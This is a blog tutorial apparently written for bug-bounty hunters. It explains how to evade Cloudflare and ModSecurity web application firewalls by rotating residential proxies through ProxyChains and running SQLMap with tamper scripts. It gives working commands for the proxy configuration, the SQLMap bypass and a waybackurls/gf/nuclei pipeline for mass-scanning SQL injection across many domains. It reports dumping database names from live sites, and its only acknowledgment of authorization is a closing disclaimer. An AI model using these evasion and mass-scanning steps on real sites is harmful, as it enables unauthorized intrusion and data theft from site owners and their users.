The Ultimate Guide to WAF Bypass Using SQLMap, Proxychains & Tamper Scripts
A Practical Guide to WAF Evasion: Mastering Advanced SQLMap Techniques with Proxychains and tamper scripts Against Cloudflare and ModSecurity
coffinxp
coffinxp

Following
7 min read
·
Apr 18, 2025
336


7






Introduction
In today’s rapidly evolving cybersecurity world Web Application Firewalls (WAFs) play a critical role in protecting websites from malicious inputs like SQL injections. But attackers and ethical hackers alike are always exploring new techniques to test and bypass such defenses.

In this guide, I’ll walk you through using SQLMap, ProxyChains and tamper scripts to test and evaluate WAF defenses. You’ll learn how to configure these tools and perform targeted scans to assess security, all while maintaining ethical guidelines and best practices

What Is a Web Application Firewall (WAF)?
AWeb Application Firewall is a security system that monitors and filters HTTP traffic to and from a web application. It protects applications by inspecting traffic and blocking malicious payloads like SQL injection, XSS and more

Features of a WAF

Request filtering
Geo-blocking
Rate limiting
Custom rule creation
Popular WAFs

Cloudflare
ModSecurity
AWS WAF
Imperva
Getting Started with the Setup
Before we begin, we’ll need the following things:

SQLMap — The powerhouse for automating SQL injections.
ProxyChains — Routes traffic through multiple proxies.
Residential Proxies — They mimic real users, perfect for avoiding detection.
Understanding Cloudflare and ModSecurity WAFs
Cloudflare: It’s one of the most popular WAFs. It’s smart, blocks based on signatures, behavior and patterns.
ModSecurity: Open-source and widely used on Apache/Nginx. Strong rule-based filtering
How WAFs Block SQL Injections
WAFs work by detecting patterns associated with malicious queries. For example:

Keywords like UNION, SELECT, DROP, etc.
Known payloads and tamper methods
Request frequency and source IPs
When SQLMap sends a payload like ‘ OR 1=1 — a WAF might instantly recognize it and respond with a 403 Forbidden or Block page. But here’s the thing: clever obfuscation and IP rotation can go a long way in bypassing these defenses.

Testing XSS Payloads Against WAFs
Using HackBar Extension to Inject Payloads
Let’s warm up with XSS. Open up HackBar in your browser, load up the test site URL and [paste the payload into the parameter you want to test:


Bam! Blocked. Cloudflare immediately detects the payload and throws up its Block page. That’s a win for them, but a roadblock for us.


On a different site using ModSecurity same result. Payloads trigger errors and requests get rejected. Clearly we need something more advanced

Initial Recon Using Ghauri
Ghauri is excellent for automated SQLi detection, especially with MySQL databases. You simply provide a URL and it scans for vulnerable parameters. In this case it initially flags the id parameter as vulnerable to boolean-based SQL injection. but after a few attempts it identifies it as a false positive.


Tools are tools they’re not perfect. A false positive doesn’t mean the target is bulletproof. You just need to outsmart. This is where manual testing and bypass techniques shine.

Configuring ProxyChains for WAF Bypass
Open the ProxyChains configuration file using the following command:

sudo mousepad /etc/proxychains.conf

By default it’s set to Tor via 127.0.0.1:9050. Comment that out using a hash # for disable local proxy and Paste residential proxies in the following format:

http <ipaddress> <port> [username] [password]
http <ipaddress> <port> [username] [password]
now after this disable the dynamic chain option and enable random chain. This improves reliability when working with multiple proxies. if one fails ProxyChains will automatically rotate to another. Also enable quiet mode to suppress ProxyChains logs while using your tools. Once done save the configuration file

#dynamic_chain
#
# Dynamic - Each connection will be done via chained proxies
# all proxies chained in the order as they appear in the list
# at least one proxy must be online to play in chain
# (dead proxies are skipped)
# otherwise EINTR is returned to the app
#
#strict_chain
#
# Strict - Each connection will be done via chained proxies
# all proxies chained in the order as they appear in the list
# all proxies must be online to play in chain
# otherwise EINTR is returned to the app
#
random_chain
#
# Random - Each connection will be done via random proxy
# (or proxy chain, see  chain_len) from the list.
# this option is good to test your IDS :)

# Make sense only if random_chain
#chain_len = 2

# Quiet mode (no output from library)
quiet_mode
Validating ProxyChains with Curl
After configuring everything, run a simple curl command through ProxyChains to verify that everything is working correctly

proxychains curl http://ipinfo.io
proxychains curl http://ipinfo.io/ip
and after this command if you receiving responses from different IP locations with each request. This confirms ProxyChains is successfully routing our traffic through the residential proxies. That’s exactly what we need to evade rate limits and bypass WAFs. you can also Visit any website using your browser through ProxyChains by entering proxychains firefox command and Your IP should keep changing.

SQLMap + ProxyChains + tampers in Action
Now, let’s use SQLMap with ProxyChains along with some tamper scripts to see if we can bypass the Cloudflare WAF using following command:

proxychains sqlmap -u 'url' --dbs --batch -p id --random-agent --tamper=between,space2comment --dbms mysql --tech=B --no-cast  --flush-session --threads 10

And look at that SQLMap successfully bypassed Cloudflare and dumped the database table names

Here are some examples of previous bypasses for 403 pages on different websites


Now let’s also try bypassing ModSecurity using the same tamper script and proxychains



As you can see we successfully retrieved the database table names from two different website Amazing right? This shows how effective ProxyChains and the right tamper scripts can be in bypassing even strong WAFs

Mass Hunting for SQL Injection Vulnerabilities
Now let’s scale this process and talk about how to mass hunt SQL injection across similar subdomains. I started with a simple Google Dork to identify similar subdomains using my dorking script

scripts/dorking.py at main · coffinxp/scripts
Contribute to coffinxp/scripts development by creating an account on GitHub.
github.com


From here, extract only the domain names and store them in a clean list.

cat urls.txt | awk -F/ '{print $3}' | sort -u
Next we use waybackurls on these domains combined with gf patterns and uro to extract unique SQL parameter URLs from passive sources

cat urls.txt | waybackurls | gf sqli | uro >new.txt

Reducing Noise for Effective Scanning
Since testing all of them at once would be inefficient we can reduce the noise by running this regex that gives us only one SQL param URL per domain a great way to quickly identify vulnerable targets across a wide range of assets.

cat urls.txt | gawk -F/ '{host=$3; sub(/:80$/, "", host); if (!(host in seen)) { print $0; seen[host] } }'

Scanning with Nuclei SQLi Template
Now Fire up Nuclei with the DAST SQLi template:

nuclei -l urls.txt  |gawk -F/ '{host=$3; sub(/:80$/, "", host); if (!(host in seen)) { print $0; seen[host] } }' | -t nuclei-templates/dast/sql-injection.yaml
nuclei -l urls.txt -t nuclei-templates/dast/sql-injection.yaml
This runs error-based SQLi checks across thousands of URLs in seconds

nuclei-templates/errsqli.yaml at main · coffinxp/nuclei-templates
Contribute to coffinxp/nuclei-templates development by creating an account on GitHub.
github.com


Conclusion
ProxyChains and SQLMap make a Powerful combo for Bypassing WAFs. When you add residential proxies and use tamper scripts, you can easily get past tough WAFs like Cloudflare and ModSecurity etc . What really makes this setup powerful is how it helps you scale your testing and automate tasks so you can focus on finding real issues instead of getting stuck on false alarms

Upnext: If you found this helpful, you’ll definitely want to check out my article How Hackers Exploit CVE-2025–29927 in Next.js Like a Pro. It’s a deep dive into real-world exploitation, bypass techniques and mass hunting tips 👇

How Hackers Exploit CVE-2025–29927 in Next.js Like a Pro
Step-by-Step mass hunting Authorization Bypass by Middleware in next.js: A Complete Exploit Walkthrough
infosecwriteups.com

Disclaimer
The content provided in this article is for educational and informational purposes only. Always ensure you have proper authorization before conducting security assessments. Use this information responsibly
